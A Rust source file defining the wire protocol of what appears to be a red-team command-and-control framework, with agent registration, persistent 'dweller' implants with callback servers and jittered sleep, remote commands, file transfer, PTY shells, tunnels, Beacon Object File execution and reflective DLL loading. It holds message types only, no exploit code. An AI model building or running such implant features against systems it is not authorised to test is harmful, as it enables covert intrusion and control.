use crate::streaming::models::StreamMessage;
use serde::{Deserialize, Serialize};

#[derive(Serialize, Deserialize, Debug, Clone, Default, PartialEq, Eq)]
pub enum InternetAccess {
    Confirmed,
    ServerReachable,
    RouteOnly,
    Unreachable,
    #[default]
    Unknown,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default, PartialEq, Eq)]
pub struct ConnectivityReport {
    #[serde(default)]
    pub internet_access: InternetAccess,
    #[serde(default)]
    pub default_route: bool,
    #[serde(default)]
    pub server_reachable: bool,
    #[serde(default)]
    pub checked_target: Option<String>,
    #[serde(default)]
    pub note: String,
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq, Eq)]
pub struct DwellerServerEndpoint {
    pub address: String,
    pub fingerprint: Option<String>,
    pub transport: String,
}

fn default_true() -> bool {
    true
}

fn default_dweller_sleep_seconds() -> u64 {
    60
}

fn default_dweller_jitter_percent() -> u8 {
    50
}

fn default_dweller_task_batch_size() -> usize {
    10
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq, Eq)]
pub struct DwellerHibernationConfig {
    #[serde(default = "default_true")]
    pub enabled: bool,
    #[serde(default = "default_dweller_sleep_seconds")]
    pub sleep_seconds: u64,
    #[serde(default = "default_dweller_jitter_percent")]
    pub jitter_percent: u8,
    #[serde(default = "default_dweller_task_batch_size")]
    pub task_batch_size: usize,
}

impl Default for DwellerHibernationConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            sleep_seconds: default_dweller_sleep_seconds(),
            jitter_percent: default_dweller_jitter_percent(),
            task_batch_size: default_dweller_task_batch_size(),
        }
    }
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq, Eq)]
pub struct DwellerPathHop {
    pub agent_id: String,
    pub agent_name: String,
    pub address: String,
    pub cidr: Option<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct DwellerRuntimeConfig {
    #[serde(default)]
    pub callback_servers: Vec<DwellerServerEndpoint>,
    #[serde(default)]
    pub hibernation: DwellerHibernationConfig,
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq, Eq)]
pub enum DwellerTaskKind {
    Command {
        command: String,
    },
    StartTunnel {
        subnet: String,
        tun_name: String,
    },
    StopTunnel,
    PortalPortForward {
        local_port: u16,
        target_addr: String,
        auth_key: Option<String>,
    },
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq, Eq)]
pub enum DwellerTaskStatus {
    Pending,
    Running,
    Completed,
    Failed,
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq, Eq)]
pub struct DwellerTaskResult {
    pub task_id: String,
    pub success: bool,
    pub output: String,
    pub error: Option<String>,
    pub finished_at: String,
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq, Eq)]
pub struct DwellerTask {
    pub task_id: String,
    pub kind: DwellerTaskKind,
    pub status: DwellerTaskStatus,
    pub created_at: String,
    #[serde(default)]
    pub updated_at: Option<String>,
    #[serde(default)]
    pub attempts: u32,
    #[serde(default)]
    pub result: Option<DwellerTaskResult>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct NetworkInterface {
    pub name: String,
    pub addresses: Vec<String>,
    pub hardware_addr: String,
    pub mtu: u32,
    pub flags: Vec<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum AgentKind {
    Generic,
    Dweller,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct AgentInfo {
    pub name: String,
    pub hostname: String,
    pub os: String,
    pub arch: String,
    pub interfaces: Vec<NetworkInterface>,
    pub auth_key: Option<String>,
    pub kind: AgentKind,
    pub stable_id: Option<String>,
    pub listener_addr: Option<String>,
    pub listener_port: Option<u16>,
    #[serde(default)]
    pub connectivity: ConnectivityReport,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct DwellerInstallRequest {
    pub dweller_id: String,
    pub dweller_name: String,
    pub listen_addr: String,
    pub listen_port: u16,
    pub auth_key: String,
    pub cert_pem: String,
    pub key_pem: String,
    pub install_path: String,
    pub config_dir: String,
    pub service_name: String,
    #[serde(default)]
    pub callback_servers: Vec<DwellerServerEndpoint>,
    #[serde(default)]
    pub parent_path: Vec<DwellerPathHop>,
    #[serde(default)]
    pub hibernation: DwellerHibernationConfig,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct DwellerInstallReceipt {
    pub dweller_id: String,
    pub dweller_name: String,
    pub hostname: String,
    pub os: String,
    pub arch: String,
    pub listen_addr: String,
    pub listen_port: u16,
    pub fingerprint: String,
    pub install_path: String,
    pub config_dir: String,
    pub service_name: String,
    #[serde(default)]
    pub callback_servers: Vec<DwellerServerEndpoint>,
    #[serde(default)]
    pub parent_path: Vec<DwellerPathHop>,
    #[serde(default)]
    pub hibernation: DwellerHibernationConfig,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum Message {
    /// Agent registration with network information
    AgentRegister(AgentInfo),
    /// Server acknowledges agent registration
    AgentAck,
    /// Server initiates an authenticated dweller session
    DwellerHello {
        auth_key: String,
    },
    /// Server updates a connected dweller's future callback server list
    ConfigureDweller {
        config: DwellerRuntimeConfig,
    },
    /// Dweller acknowledges callback server configuration
    ConfigureDwellerResponse {
        success: bool,
        message: String,
    },
    /// Hibernating dweller asks for queued tasks.
    DwellerPollTasks {
        dweller_id: String,
        max_tasks: usize,
    },
    /// Server returns queued tasks for a hibernating dweller.
    DwellerTasks {
        tasks: Vec<DwellerTask>,
    },
    /// Hibernating dweller returns task output.
    DwellerTaskResult {
        dweller_id: String,
        result: DwellerTaskResult,
    },
    /// Server requests to start tunnel for specific subnet
    StartTunnel {
        subnet: String,
        tun_name: String,
    },
    /// Agent acknowledges tunnel start
    TunnelStarted,
    /// Server requests to stop tunnel
    StopTunnel,
    /// Agent acknowledges tunnel stop
    TunnelStopped,
    /// Portal mode: Server requests port forwarding
    PortalPortForward {
        local_port: u16,
        target_addr: String,
        auth_key: Option<String>,
    },
    /// New reverse port forwarding messages
    ReversePortForwardSetup {
        connection_id: String,
        local_port: u16,
        target_host: String,
        target_port: u16,
    },
    StreamSetup {
        connection_id: String,
    },
    ReversePortForwardCleanup {
        connection_id: String,
    },
    /// Data packet for tunneling
    DataPacket(Vec<u8>),
    /// Ping/Pong for keepalive
    Ping,
    Pong,
    /// Command execution request
    CommandRequest {
        command: String,
    },
    /// Command execution response
    CommandResponse {
        output: String,
        error: Option<String>,
    },
    /// Upload a file to the agent host
    FileUpload {
        remote_path: String,
        content_b64: String,
    },
    /// File upload response
    FileUploadResponse {
        success: bool,
        message: String,
    },
    /// Install and persist a dweller listener on the remote host
    DropDweller {
        request: DwellerInstallRequest,
    },
    /// Result of a dweller installation request
    DropDwellerResponse {
        success: bool,
        message: String,
        receipt: Option<DwellerInstallReceipt>,
    },
    /// Download a file from the agent host
    FileDownloadRequest {
        remote_path: String,
    },
    /// File download response
    FileDownloadResponse {
        success: bool,
        message: String,
        remote_path: String,
        content_b64: Option<String>,
    },
    /// Start an interactive PTY shell session on the agent
    ShellSessionStart {
        session_id: String,
        cols: u16,
        rows: u16,
    },
    /// PTY shell session start acknowledgment
    ShellSessionStarted {
        session_id: String,
        success: bool,
        message: String,
    },
    /// Send input bytes to an active PTY shell session
    ShellSessionInput {
        session_id: String,
        data_b64: String,
    },
    /// PTY shell output bytes from the agent
    ShellSessionOutput {
        session_id: String,
        data_b64: String,
    },
    /// Resize an active PTY shell session
    ShellSessionResize {
        session_id: String,
        cols: u16,
        rows: u16,
    },
    /// Close an active PTY shell session
    ShellSessionClose {
        session_id: String,
    },
    /// BOF (Beacon Object File) execution request
    BofExecutionRequest {
        bof_data: Vec<u8>,
        args: Vec<u8>,
        entry_point: String,
    },
    /// BOF execution response
    BofExecutionResponse {
        output: String,
        error: Option<String>,
    },
    /// Reflective PE/DLL loading request
    ReflectiveLoadRequest {
        pe_data: Vec<u8>,
        args: String,
    },
    /// Reflective PE/DLL loading response
    ReflectiveLoadResponse {
        output: String,
        error: Option<String>,
    },
    /// Streaming protocol messages
    Stream(StreamMessage),
}

impl Message {
    // Removed unused helper methods for streaming protocol
    // These methods were never used and added unnecessary complexity
}
